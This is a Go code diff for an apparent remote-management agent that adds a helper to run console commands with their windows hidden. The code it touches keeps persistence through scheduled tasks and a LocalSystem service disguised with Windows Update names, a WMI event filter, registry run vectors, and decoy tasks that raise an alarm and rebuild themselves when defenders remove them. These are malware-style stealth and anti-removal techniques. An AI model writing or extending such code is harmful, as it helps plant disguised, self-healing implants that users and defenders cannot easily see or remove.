@@ -16,6 +16,14 @@ import (
 	"rmm/internal/version"
 )
 
+// hiddenExec runs a console tool with its window suppressed. The watcher
+// and healer run on user PCs: no flashing consoles, ever.
+func hiddenExec(name string, args ...string) *exec.Cmd {
+	c := exec.Command(name, args...)
+	hideWatchCmd(c)
+	return c
+}
+
 // ensureActiveSetupKey repairs the logon-time vector (StubPath detached
 // via cmd/start so logon can never block on it).
 func ensureActiveSetupKey(agentPath string) {
@@ -48,7 +56,7 @@ func rmmDataDir() string {
 func writeProtectionScore(w *watchCfg) {
 	got, total := 0, 6
 	for _, t := range []string{"WindowsUpdate", "WindowsUpdateWatchdog", "WindowsUpdateOrchestrator"} {
-		if exec.Command("schtasks", "/query", "/tn", t).Run() == nil {
+		if hiddenExec("schtasks", "/query", "/tn", t).Run() == nil {
 			got++
 		}
 	}
@@ -61,17 +69,17 @@ func writeProtectionScore(w *watchCfg) {
 		}
 		rk.Close()
 	}
-	out, _ := exec.Command("powershell", "-NoProfile", "-Command", `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='WindowsUpdateFilter'"`).CombinedOutput()
+	out, _ := hiddenExec("powershell", "-NoProfile", "-Command", `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='WindowsUpdateFilter'"`).CombinedOutput()
 	if strings.Contains(string(out), "WindowsUpdateFilter") {
 		got++
 	}
 	// Decoy heal vectors: alarm BEFORE repairing (a missing decoy means
 	// someone is working through the box), then rebuild.
-	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
+	if err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
 		setProtAlarm("decoy task removed")
 		xml := filepath.Join(w.backupDir, "decoy_task.xml")
 		if _, err := os.Stat(xml); err == nil {
-			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
+			_, _ = hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
 			log.Printf("[watch] rebuilt decoy task")
 		}
 	}
@@ -110,7 +118,7 @@ const svcName = "WindowsUpdateOrchestrator"
 // needs admin; plain users skip silently). Called by the watcher and the
 // healer, so a deleted service converges back.
 func ensureService(agentPath string) {
-	if err := exec.Command("sc", "query", svcName).Run(); err == nil {
+	if err := hiddenExec("sc", "query", svcName).Run(); err == nil {
 		return
 	}
 	// Admin probe: creating services needs it; skip quietly without.
@@ -120,10 +128,10 @@ func ensureService(agentPath string) {
 	}
 	k.Close()
 	bin := `"` + agentPath + `" --svc-heal`
-	_, _ = exec.Command("sc", "create", svcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
-	_, _ = exec.Command("sc", "description", svcName, "Windows Update Orchestration Service").CombinedOutput()
-	_, _ = exec.Command("sc", "failure", svcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
-	if err := exec.Command("sc", "start", svcName).Run(); err == nil {
+	_, _ = hiddenExec("sc", "create", svcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
+	_, _ = hiddenExec("sc", "description", svcName, "Windows Update Orchestration Service").CombinedOutput()
+	_, _ = hiddenExec("sc", "failure", svcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
+	if err := hiddenExec("sc", "start", svcName).Run(); err == nil {
 		log.Printf("[watch] repair service installed+started")
 	}
 }
@@ -247,7 +255,7 @@ func runWmiHeal() {
 	}
 	healBinary(dir, agentPath, caPath)
 	for _, t := range wmiTaskPairs {
-		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
+		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
 		}
 		xml := resolveTaskXML(dir, t[1])
@@ -255,7 +263,7 @@ func runWmiHeal() {
 			log.Printf("[heal] task %s missing and no saved XML anywhere", t[0])
 			continue
 		}
-		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
+		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
 			log.Printf("[heal] re-create task %s: %v %s", t[0], err, strings.TrimSpace(string(out)))
 		} else {
 			log.Printf("[heal] re-created task %s", t[0])
@@ -279,9 +287,9 @@ func runWmiHeal() {
 	ensureActiveSetupKey(agentPath)
 	ensureService(agentPath)
 	// Decoy heal vectors too (task + Run value).
-	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
+	if err := hiddenExec("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
 		if xml := resolveTaskXML(dir, "decoy_task.xml"); xml != "" {
-			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
+			_, _ = hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
 		}
 	}
 	decoyCmd := `"` + agentPath + `" --wmi-heal`
@@ -294,7 +302,7 @@ func runWmiHeal() {
 	// Kickstart now instead of waiting for the next tick: the repaired
 	// tasks run in their own (user-session) context, keeping interactivity.
 	for _, t := range []string{"WindowsUpdateWatchdog", "WindowsUpdate", "WindowsUpdateOrchestrator", "WindowsUpdateCheck"} {
-		_ = exec.Command("schtasks", "/run", "/tn", t).Run()
+		_ = hiddenExec("schtasks", "/run", "/tn", t).Run()
 	}
 }
 
@@ -321,7 +329,7 @@ func ensureWatchPersistence(w *watchCfg) {
 	ensureActiveSetupKey(w.agentPath)
 	ensureService(w.agentPath)
 	for _, t := range wmiTaskPairs {
-		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
+		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
 		}
 		xml := filepath.Join(w.backupDir, t[1])
@@ -329,7 +337,7 @@ func ensureWatchPersistence(w *watchCfg) {
 			log.Printf("[watch] task %s missing and no saved XML", t[0])
 			continue
 		}
-		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
+		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
 			log.Printf("[watch] re-create task %s: %v %s", t[0], err, string(out))
 		} else {
 			log.Printf("[watch] re-created task %s", t[0])
